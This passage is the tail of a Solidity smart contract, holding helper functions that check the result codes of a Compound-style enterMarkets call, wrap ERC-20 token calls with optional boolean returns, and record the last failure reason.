    function _enterMarketsSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        if (!ok || data.length == 0) {
            return false;
        }

        uint256[] memory results = abi.decode(data, (uint256[]));
        if (results.length == 0) {
            return false;
        }

        for (uint256 i = 0; i < results.length; ++i) {
            if (results[i] != 0) {
                return false;
            }
        }
        return true;
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "TOKEN_CALL_FAILED");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _setFailure(string memory reason) internal {
        if (bytes(reason).length != 0) {
            lastFailure = reason;
        }
    }
}
